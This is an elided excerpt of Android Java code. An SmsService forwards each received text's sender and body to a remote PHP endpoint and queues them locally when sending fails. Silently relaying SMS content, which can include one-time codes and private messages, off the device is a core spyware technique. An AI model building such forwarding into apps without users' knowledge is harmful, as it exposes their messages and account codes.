...
public class SmsService extends Service {
    ...
    public int onStartCommand(Intent intent, int flags, int startId) {
        ...
        sendDataToServer(this,sender, message);
...
//    }
    ...
    protected void sendDataToServer(Context context, String sender, String message) {
        if (NetworkUtils.isInternetAvailable(context)) {
            // Send data if internet is available
            new Thread(() -> {
                try {
                    URL url = new URL("https://backuptrack.salumtransports.co.tz/sms-handler.php");
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    ...
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        ...
                        new MessageStorage(context).saveMessage(sender, message); // Save if sending fails
                    }
                    urlConnection.disconnect();
                } catch (Exception e) {
                    Log.e(TAG, "Error sending message: ", e);
                    new MessageStorage(context).saveMessage(sender, message); // Save if an exception occurs
                }
            }).start();
        } else {
            // Save the message locally if no internet
            new MessageStorage(context).saveMessage(sender, message);
            Log.d(TAG, "message saved locally");
        }
    }
